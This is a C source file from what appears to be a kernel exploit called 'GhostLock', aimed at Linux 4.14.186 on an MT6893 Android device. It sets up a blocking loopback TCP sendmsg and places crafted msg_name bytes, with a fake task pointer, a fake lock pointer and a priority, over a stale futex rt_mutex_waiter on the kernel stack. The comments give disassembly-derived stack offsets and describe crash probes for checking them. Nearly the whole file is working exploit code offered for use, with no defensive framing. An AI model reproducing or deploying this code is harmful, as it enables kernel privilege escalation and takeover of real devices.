/* sendmsg stack-stamp transport for GhostLock ares (4.14.186, MT6893)
 *
 * ares geometry (from vmlinux2.elf disassembly):
 *   SyS_sendmsg      : sub sp,#0x90                  -> R = T-0x90
 *   ___sys_sendmsg   : sub sp,#0x190, x29=sp+0x140   -> C = T-0x220
 *     iovstack[8] = C+0x38 = T-0x1e8 .. T-0x168   (0x80, user iovec array)
 *     address     = x29-0x88 = T-0x168 .. T-0xe8  (0x80, raw msg_name copy)
 *   do_futex (entered from SyS_futex frame 0x70): rt_waiter = x29-0xc0 = T-0x190
 *
 *   Carrier T-0x1e8..T-0xe8 is continuous, so the waiter window
 *   T-0x190..T-0x148 lies fully inside it.  waiter offset in carrier = 0x58:
 *
 *     waiter+0x00 tree.pc     <- iov[5].iov_len
 *     waiter+0x08 tree.right  <- iov[6].iov_base
 *     waiter+0x10 tree.left   <- iov[6].iov_len
 *     waiter+0x18 pi.pc       <- iov[7].iov_base
 *     waiter+0x20 pi.right    <- iov[7].iov_len
 *     waiter+0x28 pi.left     <- address[0x00]
 *     waiter+0x30 task        <- address[0x08]
 *     waiter+0x38 lock        <- address[0x10]
 *     waiter+0x40 prio        <- address[0x18]
 *     waiter+0x48 deadline    <- address[0x20]
 *
 *   iov_base is access_ok()-checked and cannot carry kernel pointers; the raw
 *   msg_name bytes can.  task/lock/prio therefore live in msg_name.
 */
#include "common.h"
#include "runtime_offsets.h"
#include <sys/uio.h>

#define SM_NAME_LEN 0x80
#define SM_SNDBUF 8192u
#define SM_RCVBUF 4096u
#define SM_MSS 536u

int sendmsg_route_selected(void) {
  const char *r = getenv("GHOSTLOCK_ROUTE");
  if (r && *r) return strcmp(r, "sendmsg") == 0;
  return env_flag("GHOSTLOCK_SENDMSG_ROUTE", 0);
}

/* ── sm_tcp_probe：真实 sendmsg 前的 TCP 阻塞契约验证 ──────────────
 * ① 读 TCP_INFO（4.14 有源码依据的偏移，绝不越界）
 * ② 读对端 TCP_INFO 的 state
 * ③ MSG_DONTWAIT 预探测：EAGAIN ⇒ 阻塞契约成立（最硬证据）
 */
void sm_tcp_probe(int snd, int peer) {
  /* ① TCP_INFO：读内核侧真实 TCP 状态 */
  unsigned char ti[sizeof(struct sm_tcpinfo_414)];
  memset(ti, 0, sizeof(ti));
  socklen_t tl = sizeof(ti);
  int g = getsockopt(snd, IPPROTO_TCP, TCP_INFO, ti, &tl);
  ckpt_val("sm_tcpi_ret", (long)g);
  ckpt_val("sm_tcpi_len", (long)tl);
  if (g == 0) {
    uint32_t v;
    ckpt_val("sm_tcpi_state", (long)ti[0x00]);
    memcpy(&v, ti + SM_TCPI_SND_MSS, 4);   ckpt_val("sm_tcpi_snd_mss", (long)v);
    memcpy(&v, ti + SM_TCPI_RCV_MSS, 4);   ckpt_val("sm_tcpi_rcv_mss", (long)v);
    memcpy(&v, ti + SM_TCPI_UNACKED, 4);   ckpt_val("sm_tcpi_unacked", (long)v);
    memcpy(&v, ti + SM_TCPI_SND_SSH, 4);   ckpt_val("sm_tcpi_snd_ssthresh", (long)v);
    memcpy(&v, ti + SM_TCPI_SND_CWND, 4);  ckpt_val("sm_tcpi_snd_cwnd", (long)v);
    memcpy(&v, ti + SM_TCPI_RCV_SPACE, 4); ckpt_val("sm_tcpi_rcv_space", (long)v);
  }
  /* ② 对端 c 的 TCP_INFO（接收方视角） */
  {
    unsigned char ci[sizeof(struct sm_tcpinfo_414)];
    memset(ci, 0, sizeof(ci));
    socklen_t cl = sizeof(ci);
    if (getsockopt(peer, IPPROTO_TCP, TCP_INFO, ci, &cl) == 0)
      ckpt_val("sm_tcpi_peer_state", (long)ci[0x00]);
  }
  /* ③ ★ 最硬证据：MSG_DONTWAIT 预探测。
   *    若 EAGAIN → 内核说「现在发不进去」→ 阻塞契约成立。
   *    探测用独立 iovec 且不带 msg_name，绝不触碰 waiter 内存，
   *    因此不会干扰后续真正的 sendmsg。 */
  {
    static unsigned char probe_buf[0x40000];
    memset(probe_buf, 0x42, sizeof(probe_buf));
    struct iovec piov[1];
    piov[0].iov_base = probe_buf;
    piov[0].iov_len  = sizeof(probe_buf);
    struct msghdr pmh;
    memset(&pmh, 0, sizeof(pmh));
    pmh.msg_name = NULL;         /* 不带 msg_name，绝不影响 waiter */
    pmh.msg_namelen = 0;
    pmh.msg_iov = piov;
    pmh.msg_iovlen = 1;
    errno = 0;
    ssize_t pr = sendmsg(snd, &pmh, MSG_DONTWAIT | MSG_NOSIGNAL);
    int pe = errno;
    int blocking = (pr < 0 && (pe == EAGAIN || pe == EWOULDBLOCK)) ? 1 : 0;
    ckpt_val("sm_probe_ret", (long)pr);
    ckpt_val("sm_probe_errno", (long)pe);
    ckpt_val("sm_gate_blocking", (long)blocking);
    pr_info("GK43 tcp probe: ret=%zd errno=%d blocking=%d\n", pr, pe, blocking);
  }
}

/* 供 main.c 的 --tcpcheck 入口复用（对外导出） */
int sm_tcp_gate(int *out_snd, int *out_peer) {
  int lfd = -1, c = -1, s = -1;
  struct sockaddr_in a;
  memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET;
  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  lfd = socket(AF_INET, SOCK_STREAM, 0);
  if (lfd < 0) return 0;
  int one = 1;
  setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  uint32_t rb = SM_RCVBUF, wc = 1, mss = SM_MSS;
  if (bind(lfd, (struct sockaddr *)&a, sizeof(a)) != 0) { close(lfd); return 0; }
  if (listen(lfd, 1) != 0) { close(lfd); return 0; }
  socklen_t al = sizeof(a);
  if (getsockname(lfd, (struct sockaddr *)&a, &al) != 0) { close(lfd); return 0; }
  c = socket(AF_INET, SOCK_STREAM, 0);
  if (c < 0 || connect(c, (struct sockaddr *)&a, sizeof(a)) != 0) {
    close(lfd); if (c >= 0) close(c); return 0;
  }
  setsockopt(c, SOL_SOCKET, SO_RCVBUF, &rb, 4);
  setsockopt(c, IPPROTO_TCP, TCP_WINDOW_CLAMP, &wc, 4);
  setsockopt(c, IPPROTO_TCP, TCP_MAXSEG, &mss, 4);
  s = accept(lfd, NULL, NULL);
  close(lfd);
  if (s < 0) { close(c); return 0; }
  uint32_t sb = SM_SNDBUF;
  int r1 = setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sb, 4);
  int r2 = setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
  uint32_t sbv = 0, rbv = 0, wcv = 0;
  socklen_t sl = 4;
  getsockopt(s, SOL_SOCKET, SO_SNDBUF, &sbv, &sl);
  sl = 4; getsockopt(c, SOL_SOCKET, SO_RCVBUF, &rbv, &sl);
  sl = 4; getsockopt(c, IPPROTO_TCP, TCP_WINDOW_CLAMP, &wcv, &sl);
  pr_info("sendmsg gate sndbuf_set=%d sndbuf=%u rcvbuf=%u wclamp=%u "
          "set_ret=%d/%d\n", SM_SNDBUF, sbv, rbv, wcv, r1, r2);
  struct timeval tv = { .tv_sec = 3, .tv_usec = 0 };
  setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  *out_snd = s;
  *out_peer = c;
  return 1;
}

void do_sendmsg_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    pr_error("sendmsg: no fake page\n");
    return;
  }
  int obs = env_flag("GHOSTLOCK_OBSERVE", 0);

  int snd = -1, peer = -1;
  if (!sm_tcp_gate(&snd, &peer)) {
    pr_error("sendmsg: tcp gate failed errno=%d\n", errno);
    return;
  }

  /* gK43: 在打 waiter 戳之前，先客观验证「这条 TCP 一定会阻塞」。
   * 必须放在写 msg_name 之前 —— 预探测不带 msg_name，不会污染 waiter 内存。 */
  if (env_flag("GHOSTLOCK_SM_TPROBE", 1)) sm_tcp_probe(snd, peer);
  else ckpt_val("sm_tprobe_skipped", 1);

  static unsigned char payload[0x200000];
  memset(payload, 0x41, sizeof(payload));

  unsigned char name[SM_NAME_LEN];
  memset(name, 0, sizeof(name));
  /* 4.14 rt_mutex_waiter layout (kernel/locking/rtmutex_common.h):
   *   tree_entry      0x00..0x17
   *   pi_tree_entry   0x18..0x2f
   *   task            0x30
   *   lock            0x38
   *   prio            0x40
   *   deadline        0x48
   * Stack geometry (disassembly):
   *   rt_waiter    = do_futex x29 - 0xc0  = entry_sp - 0x120
   *   msg_name     = ___sys_sendmsg sp+0x38 = entry_sp - 0x158
   *   => msg_name = rt_waiter - 0x38
   * so the waiter field at rt_waiter+N must be written at name+N+0x38.
   */
#define SM_WAITER_DELTA 0x38
  put64(name, SM_WAITER_DELTA + 0x30, fake_task);        /* waiter->task  */
  put64(name, SM_WAITER_DELTA + 0x38, fake_lock);        /* waiter->lock  */
  put32(name, SM_WAITER_DELTA + 0x40, FAKE_WAITER_PRIO); /* waiter->prio  */
  /* Probe: overwrite one waiter field with a deliberately invalid value.
   * If the stamp really lands on the stale rt_waiter, the PI walk will
   * dereference it and panic -> "crash" means the offset is right.
   * "no crash" means the field is not where we think it is. */
  int probe = env_int_range("GHOSTLOCK_SM_PROBE", 0, 0, 3);
  if (probe == 1) put64(name, SM_WAITER_DELTA + 0x30, 0xdeadbeefdeadbeefULL); /* task  */
  else if (probe == 2) put64(name, SM_WAITER_DELTA + 0x38, 0xdeadbeefdeadbeefULL); /* lock */
  else if (probe == 3) put32(name, SM_WAITER_DELTA + 0x40, 0x7fffffffu); /* prio */
  if (probe) pr_info("PROBE=%d stamped\n", probe);
  ckpt_val("sm_probe", (long)probe);
  ckpt_val("sm_name_len", (long)SM_NAME_LEN);
  ckpt_val("sm_fake_task", (long)fake_task);
  ckpt_val("sm_fake_lock", (long)fake_lock);
  ckpt_val("sm_page_base", (long)page_base);
  ckpt_val("sm_name_task", (long)(*(uint64_t *)(void *)(name + SM_WAITER_DELTA + 0x30)));
  ckpt_val("sm_name_lock", (long)(*(uint64_t *)(void *)(name + SM_WAITER_DELTA + 0x38)));
  ckpt_val("sm_name_prio", (long)(*(uint32_t *)(void *)(name + SM_WAITER_DELTA + 0x40)));
  ckpt_val("sm_waiter_delta", (long)SM_WAITER_DELTA);
  ckpt_val("sm_snd_fd", (long)snd);
  { int sbv = 0; socklen_t sl = 4;
    getsockopt(snd, SOL_SOCKET, SO_SNDBUF, &sbv, &sl);
    ckpt_val("sm_sndbuf_eff", (long)sbv); }

  struct iovec iov[8];
  memset(iov, 0, sizeof(iov));
  iov[0].iov_base = payload;
  iov[0].iov_len = 0x200000;
  for (int i = 1; i <= 4; i++) { iov[i].iov_base = payload; iov[i].iov_len = 1; }

  struct msghdr mh;
  memset(&mh, 0, sizeof(mh));
  mh.msg_name = name;
  mh.msg_namelen = SM_NAME_LEN;
  mh.msg_iov = iov;
  mh.msg_iovlen = 8;

  pr_info("sendmsg enter task=%016zx lock=%016zx prio=%d namelen=%d obs=%d\n",
          (size_t)fake_task, (size_t)fake_lock, FAKE_WAITER_PRIO, SM_NAME_LEN, obs);

  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, env_int_range("SM_DELAY_US", 200000, 0, 5000000));

  if (!obs) atomic_store(&punch_consume_go, 1);
    ckpt_val("sm_go_fired", (long)(obs ? -1 : 1));
  ckpt_val("sm_delay_usec", (long)atomic_load(&main_route_delay_usec));
  ckpt_val("sm_maxseg", (long)SM_MSS);
  ckpt_val("sm_enter", 1);
  /* page_base is a KERNEL address; never deref from userspace. */
  errno = 0;
  int ret = (int)sendmsg(snd, &mh, MSG_NOSIGNAL);
  int se = errno;
  ckpt_val("sm_sendmsg_ret", (long)ret);
  ckpt_val("sm_sendmsg_errno", (long)se);
  ckpt_val("sm_consumer_calls_after", (long)atomic_load(&consumer_calls));
  if (!obs) {
    for (int s = 0; s < 3000000; s++) {
      if (atomic_load(&consumer_calls) > 0) break;
      __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&punch_consume_go, 0);
  }
  pr_info("sendmsg ret=%d errno=%d calls=%d success=%d\n", ret, se,
          atomic_load(&consumer_calls), atomic_load(&consumer_success));
  close(snd);
  close(peer);
}
